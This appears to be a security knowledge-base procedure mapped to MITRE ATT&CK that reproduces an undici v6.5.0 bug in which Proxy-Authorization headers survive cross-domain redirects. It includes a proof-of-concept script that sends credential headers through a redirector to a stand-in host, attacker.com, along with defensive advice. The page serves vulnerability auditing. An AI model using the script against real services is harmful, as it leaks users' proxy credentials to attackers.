---
tags:
  - exploitation
  - header-injection
  - redirect
  - undici
type: procedure
tools:
  - '[[tools/undici]]'
tactics:
  - '[[Credential Access]]'
commands:
  - '[[commands/undici-redirect-test]]'
verified: false
platforms:
  - Web
  - Node.js
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unsecured Credentials]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:29:28.375Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: da922e0c-abb7-4e95-971b-18ba15ba8a1c
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Unsecured Credentials]]'
  - '[[Exploit Public-Facing Application]]'
---
# Execute-Undici-Request-with-Proxy-Authorization

## Summary

This procedure sets up and executes an HTTP request using the undici library in Node.js, including a Proxy-Authorization header, targeted at a cross-domain redirect endpoint to reproduce the vulnerability and demonstrate header forwarding to an attacker-controlled site.

## Description

The undici library (v6.5.0) fails to clear Proxy-Authorization headers during redirects across domains, unlike authorization and cookie headers. By sending a request to a redirector (e.g., http://anysite.com/redirect.php?url=http://attacker.com:8182/vvv) with maxRedirections: 3, the header leaks to the final URL. This is useful for auditing Node.js applications using undici for HTTP proxying.

## Requirements

1. Node.js installed with undici v6.5.0
2. Attacker server running on port 8182 to capture requests
3. Access to a redirect endpoint that performs cross-domain forwarding
4. Basic JavaScript knowledge

## Defense

Defensive measures and detection strategies:

- Upgrade undici to a version that patches this issue (post-v6.5.0)
- Manually strip Proxy-Authorization headers before redirects in code
- Log and monitor outgoing requests for sensitive header presence
- Use proxy configurations that avoid client-side header exposure

## Objectives

1. Trigger a cross-domain redirect with sensitive headers
2. Verify request forwarding to attacker site
3. Confirm vulnerability in undici's redirect handling

## Instructions

### Step 1: Set Up Environment

**Context**: Install undici and prepare the script.

```bash
npm install undici@6.5.0
```

> Installs the vulnerable version for testing.

### Step 2: Execute the Request

**Context**: Run the undici request to the redirect endpoint with headers.

**Command** ([[commands/undici-redirect-test]]):
```javascript
import { request } from 'undici'
const {
 statusCode,
 headers,
 body
} = await request('http://anysite.com/redirect.php?url=http://attacker.com:8182/vvv',{
 maxRedirections: 3,
 headers: {
 "autHorization": 'tes123t',
 "coOkie": "ddd=dddd",
 "X-CSRF-Token": 't5k3zni6fbdqbnce58zbkh7c4o',
 'Proxy-Authorization':'xxxxxxxx'
 }
})

console.log('response received', statusCode)
console.log('headers', headers)

for await (const data of body) {
 console.log('data', data)
}
```

> This sends the request, follows up to 3 redirects, and logs the response. The Proxy-Authorization header will be included in the final request to attacker.com.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access

### Techniques

- [[Unsecured Credentials]] Unsecured Credentials
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/undici-redirect-test]]

## Tools Used

- [[tools/undici]]

## Tags

- [[exploitation]]
- [[header-injection]]
